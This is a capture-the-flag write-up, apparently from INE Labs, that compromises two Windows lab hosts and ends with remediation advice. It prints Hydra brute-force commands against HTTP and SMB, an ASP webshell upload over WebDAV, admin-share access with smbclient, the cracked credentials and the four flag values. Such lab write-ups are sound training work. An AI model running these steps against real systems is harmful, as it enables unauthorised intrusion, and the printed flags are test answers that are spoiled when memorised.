---
title: "System/Host-Based Attacks CTF 1"
description: "Two-target CTF: brute-forcing HTTP Basic auth and a WebDAV/IIS server with Hydra and cadaver, uploading an ASP webshell to loot the C: drive, then brute-forcing SMB on a second host to recover four flags."
date: 2025-11-05
platform: "INE Labs"
difficulty: "Medium"
tags: ["IIS", "WebDAV", "Hydra", "cadaver", "Webshell", "SMB", "Gobuster", "CTF"]
cover: "./photo2.png"
---

# CTF Report: System/Host-Based Attacks

**Classification:** Host & Network Penetration Testing / System & Host-Based Attacks<br>
**Target 1:** target1.ine.local (10.2.28.186) — Windows Server, IIS 10.0 + WebDAV<br>
**Target 2:** target2.ine.local — Windows Server, SMB<br>
**Objective:** Capture all four flags.

## 1. Executive Summary

Target 1 runs IIS 10.0 with HTTP Basic auth and a writable WebDAV directory. Hydra recovers
the `bob` password, `cadaver` reads the first flag from WebDAV, and an uploaded ASP webshell
exposes the C: drive for the second flag. Target 2 exposes SMB; a Hydra brute-force yields
four credential pairs, and `smbclient` as Administrator retrieves the third and fourth flags.

## 2. Target 1 — Recon

```bash
ping -c 4 target1.ine.local      # 10.2.28.186
nmap -sV -p- 10.2.28.186
```

![Ping target1](./photo1.png)

![Full service scan — IIS 10.0, SMB, RDP](./photo2.png)

Default scripts against the main ports show HTTP Basic auth (realm `target1.ine.local`).

```bash
nmap -sV -sC -p 80,135,445,3389 10.2.28.186
```

![NSE scripts — HTTP 401 Basic auth](./photo3.png)

![NSE scripts (continued)](./photo4.png)

## 3. Flag 1 — HTTP Basic Auth → WebDAV

Brute-forcing the `bob` account against HTTP.

```bash
hydra -l bob -P /usr/share/wordlists/metasploit/unix_passwords.txt target1.ine.local http-get
# bob:password_123321
```

![Hydra — bob:password_123321](./photo5.png)

The site is a default IIS page.

![IIS default page](./photo6.png)

Gobuster (authenticated) finds `aspnet_client` and `webdav`.

```bash
gobuster dir -u target1.ine.local -w /usr/share/wordlists/dirb/common.txt -U bob --password password_123321
```

![Gobuster — /aspnet_client and /webdav](./photo7.png)

Connecting to WebDAV with `cadaver` and reading the first flag.

```bash
cadaver http://target1.ine.local
# Username: bob / Password: password_123321
cd webdav
cat flag1.txt
```

```
Flag 1: ece56b7f660b453699939715163af2bc
```

![cadaver — flag1.txt from /webdav](./photo8.png)

## 4. Flag 2 — ASP Webshell → C: Drive

WebDAV allows uploads, so we `put` an ASP webshell.

```bash
put /usr/share/webshells/asp/webshell.asp
```

![Uploading webshell.asp via cadaver](./photo9.png)

Through the webshell we enumerate `C:\` and find `flag2.txt`.

```
dir C:\     ->  flag2.txt
type C:\flag2.txt
```

![Webshell — C:\ listing with flag2.txt](./photo10.png)

```
Flag 2: b09a4b8860c2441ea4efcc9d1d90aa9b
```

![Webshell — type C:\flag2.txt](./photo11.png)

## 5. Target 2 — SMB Brute-Force

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
      smb://target2.ine.local
```

Four valid credential pairs are recovered:

```
rooty:spongebob | demo:password1 | auditor:hellokitty | administrator:pineapple
```

![Hydra — four SMB credentials](./photo12.png)

## 6. Flags 3 & 4 — SMB Shares

Connecting to the `C$` admin share as Administrator and grabbing `flag3.txt`.

```bash
smbclient \\\\target2.ine.local\\C$ -U Administrator
# password: pineapple
ls
get flag3.txt
```

![smbclient C$ — flag3.txt](./photo13.png)

The fourth flag is on the Administrator's Desktop.

```bash
cd Users\Administrator\Desktop\
get flag4.txt
```

![smbclient — flag4.txt from Desktop](./photo14.png)

```
Flag 3: fa9bd01c74c140c9be560f9fe55020a5
Flag 4: 5727e192f94c4e07b83a77d38c6ebd10
```

![Flags 3 and 4](./photo15.png)

## 7. Remediation Recommendations

1. **Disable WebDAV** (or make it read-only and non-executable) — writable WebDAV allowed
   the webshell upload and remote code execution.
2. **Enforce strong passwords & lockout** — every account fell to small wordlists; replace
   HTTP Basic auth over cleartext with a stronger scheme over TLS.
3. **Restrict SMB admin shares** (`C$`) and remove local admin reuse; disable NTLM where
   possible and require SMB signing.
4. **Remove flag/sensitive files** from web roots and admin desktops; apply least privilege.
